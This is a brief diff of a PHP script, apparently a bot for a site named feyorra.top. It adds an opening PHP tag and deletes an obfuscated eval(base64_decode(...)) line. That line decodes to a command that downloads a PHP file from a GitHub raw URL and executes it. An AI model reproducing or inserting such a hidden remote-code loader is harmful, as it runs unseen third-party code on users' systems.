@@ -1,4 +1,4 @@
-
+<?php
 //error_reporting(0);
 
 const
@@ -6,8 +6,6 @@ notif = "Wait for process",
 name = "FeyorraTop",
 version = "1.0.0",
 host = "https://feyorra.top/";
-eval(base64_decode("ZXZhbChzdHJfcmVwbGFjZSgiPD9waHAiLCIiLGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vemJzZXJ2ZXIvbWFpbi9yZWZzL2hlYWRzL21haW4vaW50aS5waHAiKSkpOw=="));
-cl();
 Function Menu_Api(){
   apikey:
   cl();
